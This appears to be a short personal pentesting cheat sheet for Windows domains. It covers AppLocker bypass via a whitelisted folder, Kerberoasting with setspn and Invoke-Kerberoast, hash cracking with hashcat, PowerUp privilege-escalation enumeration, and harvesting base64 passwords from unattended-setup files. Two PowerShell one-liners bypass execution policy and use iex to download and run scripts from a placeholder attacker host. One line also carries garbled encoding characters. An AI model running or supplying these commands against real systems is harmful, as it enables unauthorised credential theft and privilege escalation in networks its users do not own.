## Bypassing Applocker

Applocker restricts which users are allowed to execute a program based on the path, publisher and hash.

`C:\Windows\System32\spool\drivers\color` Is a directory that by default is whitelisted.
`%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` Is a location for the Powershell history.

## Kerberoasting

`setspn -T medin -Q */*` - Extract all accounts in the SPN, which is the mapping between service and account.

If there is an SPN for a user we can use Invoke-Kerberoast and get a ticket.

Download the Powershell [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1):

``` powershell
powershell -ep bypass;
iex(New-Object Net.WebClient).DownloadString('https://<attacker IP>/Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat hashcat |fl #Load this into memory
```

`hashcat -m 13100 -a 0 hash.txt <wordlist> --force` - Crack the hash you got.

## Privilege Escalation

[PowerUp1.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1) is a script that enumerate any weaknesses to abuse for local privilege escalation

Download the script:

``` powershell
powershell -ep bypass;
iexâ€‹(New-Object Net.WebClient).DownloadString('http://<attacker ip>/PowerUp.ps1')
```

##### UnattendPath way

Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.

It is also where users passwords are stored in base64 encoding.

`C:\Windows\Panther\Unattend\Unattended.xml` - The file for the encoded password.